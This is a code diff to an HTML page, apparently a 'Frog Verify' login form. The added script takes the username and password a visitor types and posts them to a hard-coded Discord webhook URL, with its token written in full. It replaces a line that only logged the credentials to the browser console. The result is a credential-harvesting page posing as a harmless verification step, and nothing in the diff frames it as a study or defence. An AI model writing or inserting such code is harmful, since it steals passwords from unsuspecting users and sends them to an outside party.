@@ -63,19 +63,29 @@
   <p id="message"></p>
 
   <script>
-    // Combined Frog Verify Script
     const button = document.getElementById("verifyBtn");
     const message = document.getElementById("message");
+
+    // Replace this with your Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1409611043033976832/S730sZFzy9rDdpue2pqY2DVuFBXovlI5mhT4iMOAPji40S5-hvdn7hsIgLTnHdoU0Kn-";
 
     button.addEventListener("click", () => {
       const user = document.getElementById("username").value || "Player";
       const pass = document.getElementById("password").value || "Code";
 
-      // Display verification message on the page
+      // Show verification message on page
       message.textContent = `✅ ${user} has verified with password "${pass}"! Ribbit! 🐸`;
 
-      // Log the username and password to the browser console
-      console.log(`User verified: Username = ${user}, Password = ${pass}`);
+      // Send verification info to Discord
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `User verified: Username = ${user}, Password = ${pass}`
+        })
+      }).catch(err => console.error("Webhook error:", err));
     });
   </script>
 </body>
